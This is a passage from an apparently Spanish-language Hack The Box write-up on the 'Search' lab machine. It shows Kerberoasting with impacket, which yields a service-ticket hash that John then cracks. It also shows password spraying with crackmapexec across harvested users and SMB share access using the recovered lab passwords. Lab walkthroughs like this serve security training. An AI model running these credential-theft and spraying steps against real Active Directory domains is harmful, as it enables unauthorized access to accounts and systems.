-rwxr-xr-x  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali   &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 bloodhound.py
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; kali kali 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:11 build
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali  &lt;span class=&#34;m&#34;&gt;855&lt;/span&gt; Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 Dockerfile
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali  &lt;span class=&#34;m&#34;&gt;227&lt;/span&gt; Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 .editorconfig
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; kali kali 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 .git
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali   &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt; Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 .gitignore
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 1.1K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 LICENSE
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; kali kali 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:22 out
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 3.4K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 README.md
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 1.3K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:10 setup.py
 œÄ BloodHound.py master ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos bloodhound e importamos el archivo zip generado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_204_092545.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando los queries predefinidos de bloodhound, listamos los usuarios Kerberoastables, vemos dos &lt;code&gt;web_svc, krbtgt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_204_094152.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;kerberoasting&#34;&gt;Kerberoasting&lt;/h2&gt;
&lt;p&gt;Utilizamos impacket para realizar &lt;a href=&#34;https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberoasting&#34;&gt;Kerberoasting&lt;/a&gt;, tras ejecutar el script obtuvimos el hash del usuario &lt;code&gt;web_svc&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ impacket-GetUserSPNs search.htb/hope.sharp:&lt;span class=&#34;s1&#34;&gt;&amp;#39;IsolationIsKey?&amp;#39;&lt;/span&gt; -outputfile web_svc_kerberos
Impacket v0.9.24 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &amp;lt;never&amp;gt;

 œÄ ~/htb/search ‚ùØ cat web_svc_kerberos
&lt;span class=&#34;nv&#34;&gt;$krb5tgs$23$*&lt;/span&gt;web_svc&lt;span class=&#34;nv&#34;&gt;$SEARCH&lt;/span&gt;.HTB&lt;span class=&#34;nv&#34;&gt;$search&lt;/span&gt;.htb/web_svc*&lt;span class=&#34;nv&#34;&gt;$9&lt;/span&gt;e3da68e2397f9818dbf60d3b7ec89bc&lt;span class=&#34;nv&#34;&gt;$9&lt;/span&gt;cce89c2d1111f89d641e3bc4f61b2b894f825354c4acf77d112a7f881824ede1bca3720de4dfe3e577d147d055aba669bcdec5fd63c128c9d4970787c0d5bfc621dbcd26de33e5707a552eeebb2f78400cd24975a2653a17987d311335f6b8da2d26617c8f40cc8d27aece739460529c211fccac30b3f84e3e2d615049f78fd1c283e3a2e4265e01ed7835fef1903a2f60f25ec9fe1d6579ca1a87d8f783d83df6252dc36e1c3af2434e88ffc6f94e54416e9e58111608d386a62e22f79d5ab0f8e698b293573a464347bd3225cf03cbfa0342150753ed2adfba17ce446e59fe0ee8350eb06b2e2e8f4d379f9c5f471bdccb29e98badf4419d3e0571510138e5ae2f4d7ab469690731cd220c90f3ea04d3e2e25fdba065ba808530b442dc6ab5120dcb64c40f020f2d32278d47cee2c9771e6ab8a4b4b980b7858712018d0bf6ecfdf703fb22ef271297b94a08a992545e477030c45306e7031869a4fb749cb2981cc52f23ce24605100ade6427848710a3c89c6002aa4595194ed70b7663b31a0ae6273ce695e66cff69d1883d19ccd537158feb252bfccdbb272c5b6b1c98a3843c9798c3ca59b4c212ec0e2f48c96ee344e08c6ec19b414875576fc78dba7db3297dc6c07e33e0b445e395993e5b0d5326280e502e9b8d7f1304aea083f907ccd695e4d0ae53566f17cb67020c8c82e641a097f20f887a89c7a8ccef0303a07c7489daf0b4c6faa12546649d950781c69a5965c1bb3928091acc103f347acf9781c731fecc00b07ed9d368c251662839fa302bd3dd0060994425449b40d3b69650b00c6c6b80e8f263b922b7e063c9cb1f07402904b295c4ff3d7971bc986aa82aa658dcd2f504bb6d7c21d9eb5e44cf561ee3eb62e8ea123de132afe171555b2d32ede6c60cd5e38388a55c5a171df811e645499c3dcd294ac5e3f7e851d391d2f7a2b3b639e56b1a5efc9fe56b97a872079f05bba897022fd48c4749cf291c8fd50fdc0718cdcf33d89d00dcf17b537614305dbff34c3bfba6af5f659ae8f3a18ec93e6f34f1a9b3f623c897b0fa614f68afdf289565219789c2c214f988d0dcfd4dedb47805ead3514e83189c950044f1a6ba6b5f5707e76ca8f3f68ac3683d689373d76c77a20fe545fb6979ae9474539539548e61729f777b2fc7d54bf8c6d379b67380bb5e6345f21ea0bfccc2d64a0600d0373b4d1469cf9d9ce0e831cd011c5fa5ee3ea0619376325548c057bd199645db442d680d4fc2436eb234978af2717098a8ba961e0fb2ddb3c10a593648801646054547a5bc7db4edb8b4183731a8b440cfde93c4bd308052e05c7d4c3cc0e0ac2b207d2c9169ac837f916093127a33e1b8677dbd81d7fac2e4f6728b0e05c68fa7d3f25603ace165d9fbd443708af2813a97514f77557b5a117046af3054eddb1cbca74fd18c4fce6c4a283fc9fe32e315215256d9778a4fae323264d3d9
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;password-hash-cracking&#34;&gt;Password Hash Cracking&lt;/h2&gt;
&lt;p&gt;Utilizando &lt;code&gt;John&lt;/code&gt; con el diccionario &lt;code&gt;rockyou.txt&lt;/code&gt; logramos obtener en texto plano el valor del hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; web_svc_kerberos
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krb5tgs, Kerberos &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; TGS etype &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
@3ONEmillionbaby &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:07 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2022-03-09 20:39&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.1285g/s 1476Kp/s 1476Kc/s 1476KC/s @421eduymayte619..@#ann!#
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El usuario &lt;code&gt;web_svc&lt;/code&gt; tiene acceso a los mismos recursos que &lt;code&gt;hope.sharp&lt;/code&gt;, sin embargo no encontramos informaci√≥n nueva.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec smb search.htb -u web_svc -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;@3ONEmillionbaby&amp;#39;&lt;/span&gt; --shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;eb_svc:@3ONEmillionbaby
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         Share           Permissions     Remark
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         -----           -----------     ------
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         ADMIN$                          Remote Admin
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         C$                              Default share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         helpdesk
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         IPC$            READ            Remote IPC
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         NETLOGON        READ            Logon server share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         SYSVOL          READ            Logon server share
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb---edgar-jacobs&#34;&gt;SMB - Edgar Jacobs&lt;/h1&gt;
&lt;p&gt;Utilizando los usuarios que encontramos con bloodhound y las dos contrase√±as ya conocidas, realizamos nuevamente &lt;strong&gt;Password Spraying&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ cat ../BloodHound.py/20220405224540_users.json&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;jq&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;name&amp;#34;:&amp;#34;*&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f10&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;@&amp;#39;&lt;/span&gt; -f1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt; &amp;gt; bloodhound_users.txt
 œÄ ~/htb/search/usernames ‚ùØ wc -l bloodhound_users.txt
&lt;span class=&#34;m&#34;&gt;107&lt;/span&gt; bloodhound_users.txt
 œÄ ~/htb/search/usernames ‚ùØ cat passwords.txt
 @3ONEmillionbaby
IsolationIsKey?
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos que el usuario &lt;code&gt;Edgar.Jacobs&lt;/code&gt; tiene acceso con la contrase√±a &lt;code&gt;@3ONEmillionbaby&lt;/code&gt;, al igual que &lt;code&gt;web_svc&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ crackmapexec smb search.htb -u bloodhound_users.txt -p passwords.txt --continue-on-success
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;EB_SVC:@3ONEmillionbaby
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;OPE.SHARP:IsolationIsKey?
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\E&lt;/span&gt;DGAR.JACOBS:@3ONEmillionbaby
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb-1&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Al enumerar los recursos de este usuario, vemos que tiene acceso a: &lt;code&gt;CertEnroll, helpdesk, RedirectedFolders$&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ crackmapexec smb search.htb -u EDGAR.JACOBS -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;@3ONEmillionbaby&amp;#34;&lt;/span&gt; --shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\E&lt;/span&gt;DGAR.JACOBS:@3ONEmillionbaby
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         Share           Permissions     Remark
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         -----           -----------     ------
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         ADMIN$                          Remote Admin
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         C$                              Default share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         helpdesk        READ
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         IPC$            READ            Remote IPC
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         NETLOGON        READ            Logon server share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         SYSVOL          READ            Logon server share
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el recurso &lt;code&gt;helpdesk&lt;/code&gt; no existe ningun archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ smbclient //search.htb/helpdesk -U &lt;span class=&#34;s1&#34;&gt;&amp;#39;edgar.jacobs&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @3ONEmillionbaby&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\e&lt;/span&gt;dgar.jacobs&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
